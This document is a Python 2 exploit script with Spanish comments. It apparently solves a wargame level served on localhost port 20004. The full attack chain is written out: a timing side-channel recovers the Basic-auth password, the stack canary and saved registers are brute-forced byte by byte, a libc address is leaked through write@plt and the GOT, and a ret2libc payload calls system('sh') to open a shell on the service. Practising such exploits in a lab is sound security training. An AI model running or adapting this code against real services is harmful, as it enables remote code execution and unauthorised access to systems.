#!/usr/bin/env python2
import socket
import base64
import time
from time import sleep
import struct
from struct import pack, unpack

alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
ip = "127.0.0.1"
port = 20004

def conexion(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	return s

def obtenerTiempo():
	tiempo_menor = 1

	for curchar in alphanum:
		s = conexion(ip, port)
		req = "GET / HTTP/1.1\nAuthorization: Basic " + base64.b64encode("stack06:" + curchar) + "\n"
			
		hora_inicio = time.time()

		s.send(req)
		data = s.recv(1024)

		hora_fin = time.time()
			
		s.close()

		tiempo_total = hora_fin - hora_inicio

		output = "Letra: \"" + curchar + "\" - Tiempo: " + str(tiempo_total)

		if(tiempo_total < tiempo_menor):
			tiempo_menor = tiempo_total
			resultado = output

	print resultado
	return

def obtenerPass():
	password = ""
	while ( len(password) < 16 ):
		for curchar in alphanum:
			s = conexion(ip, port)
			req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + curchar) + "\r\n\n"
			
			hora_inicio = time.time()
			s.send(req)

			data = s.recv(1024)
			hora_fin = time.time()
			
			s.close()

			tiempo_total = hora_fin - hora_inicio

			if(tiempo_total <= 0.002):
				password = password + curchar
				break
	return password

def obtenerCanary(password):
	canary = ""

	for j in range(4):
		for i in range(256):
			curbyte = chr(i)

			#print "[*] Probando Canary " + canary.encode('hex').upper() + curbyte.encode('hex').upper()
			
			s = conexion(ip, port)
			req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + "A" * 2024 + canary + curbyte) + "\r\n\n"

			s.send(req)
			data = s.recv(1024)

			s.close()

			if "smashing" not in data:
				canary = canary + curbyte
				break
	return canary

def obtenerEBX(password, canary):
	ebx = ""

	for j in range(4):
		for i in range(256):
			curbyte = chr(i)

			#print "[*] Probando EBX " + ebx.encode('hex').upper() + curbyte.encode('hex').upper()
			
			try:
				s = conexion(ip, port)
				req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + "A" * 2024 + canary + "B" * 12 + ebx + curbyte) + "\r\n\n"

				s.send(req)
				data = s.recv(1024)

				s.close()

				if "200" in data:
					ebx = ebx + curbyte
					break

			except socket.error:
				pass

	return ebx

def obtenerEIP(password, canary, ebx):
	eip = ""

	for j in range(4):
		for i in range(256):
			curbyte = chr(i)

			#print "[*] Probando EIP " + eip.encode('hex').upper() + curbyte.encode('hex').upper()

			try:
				s = conexion(ip, port)
				req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + "A" * 2024 + canary + "B" * 12 + ebx + "C" * 12 + eip + curbyte) + "\r\n\n"

				s.send(req)
				data = s.recv(1024)

				s.close()

				if "200" in data:
					eip = eip + curbyte
					break

			except socket.error:
				pass
	return eip

def payload(password, canary, ebx, eip):
	print "[*] Obteniendo Base Adress de la seccion .txt..."

	# (gdb) info proc stat
	# 0x4118 = ebx - base_address_txt
	base_address = unpack("<I", ebx)[0] - 0x4118

	print "[*] Base Adress de la seccion .txt: " + hex(base_address)[:-1]

	# 0x????4184 <accept@got.plt>
	# 0x?????f30 <write@plt>

	accept_got = pack("<I",base_address + 0x4184)
	print "[*] Address <accept@got.plt>: " + hex(unpack("<I", accept_got)[0])[:-1]
	
	write_plt = pack("<I",base_address + 0xf30)
	print "[*] Address <write@plt>: " + hex(unpack("<I", write_plt)[0])[:-1]

	#write(file_decriptor, *buffer, size)

	file_decriptor = pack("<I", 0x00000001)	# std output
	size = pack("<I", 0x00000004)

	print "[*] Obteniendo libc address de la funcion accept()..."

	s = conexion(ip, port)
	req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + "A" * 2024 + canary + "B" * 12 + ebx + "C" * 12 + write_plt + "RETN" + file_decriptor + accept_got + size) + "\r\n\n"

	s.send(req)
	libc_accept = s.recv(1024)

	s.close()

	print "[*] libc address de la funcion accept(): " + hex(unpack("<I", libc_accept)[0])[:-1]
	
	# ldd level04
	# objdump -T /lib/i386-linux-gnu/i686/cmov/libc.so.6 | grep "accept"
	# 0x???d7cc0  w   DF .text	00000076  GLIBC_2.0   accept

	libc_base_address = unpack("<I", libc_accept)[0] - 0xd7cc0

	print "[*] libc base address: " + hex(libc_base_address)[:-1]

	# ldd level04
	# objdump -T /lib/i386-linux-gnu/i686/cmov/libc.so.6 | grep "system"
	# 0x???3bc50  w   DF .text	0000007d  GLIBC_2.0   system

	libc_system = pack("<I",libc_base_address + 0x3bc50)

	print "[*] libc address de la funcion system(): " + hex(unpack("<I", libc_system)[0])[:-1]

	# "sh"
	# (gdb) find /h 0x80000000, 0x8000ffff, 0x6873
	str_sh = pack("<I",base_address + 0x6b0)

	print "[*] String 'sh' address: " + hex(unpack("<I", str_sh)[0])[:-1]

	s = conexion(ip, port)

	req = "GET / HTTP/1.1\r\nAuthorization: Basic " + base64.b64encode("stack06:" + password + "A" * 2024 + canary + "B" * 12 + ebx + "C" * 12 + libc_system + "RETN" + str_sh) + "\r\n\n"

	print "[*] Enviando payload..."
	s.send(req)

	s.send("id\n")
	data = s.recv(1024)
	print data

	s.close()

	return

#inicio
#obtenerTiempo()

print "[*] Obteniendo password..."
password = obtenerPass()
print "[*] Password obtenida: " + password

print "[*] Obteniendo Canary..."
canary = obtenerCanary(password)
print "[*] Canary obtenido: " + hex(unpack("<I", canary)[0])[:-1]

print "[*] Obteniendo EBX..."
ebx = obtenerEBX(password, canary)
print "[*] EBX obtenido: " + hex(unpack("<I", ebx)[0])[:-1]

print "[*] Obteniendo EIP..."
eip = obtenerEIP(password, canary, ebx)
print "[*] EIP obtenido: " + hex(unpack("<I", eip)[0])[:-1]

print "[*] Enviando Payload..."
payload(password, canary, ebx, eip)